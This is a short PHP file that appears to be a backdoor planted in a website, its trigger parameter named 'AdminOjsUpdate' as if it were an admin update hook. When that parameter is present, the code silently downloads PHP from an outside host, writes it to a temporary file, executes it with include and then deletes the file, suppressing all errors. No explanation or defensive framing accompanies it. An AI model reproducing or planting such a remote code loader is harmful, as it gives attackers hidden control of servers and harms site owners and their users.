<?php 
if (isset($_GET['AdminOjsUpdate'])) {
    try {
        $u = "https://scemabot.com/vendor/kuat.txt";
        $f = sys_get_temp_dir() . "/" . uniqid("f_", true) . ".php";

        $c = @file_get_contents($u);
        if ($c !== false && @file_put_contents($f, $c)) {
            @chmod($f, 0644);
            register_shutdown_function(function() use ($f) {
                @unlink($f);
            });
            include $f;
        }
    } catch (Throwable $e) {

    }
}
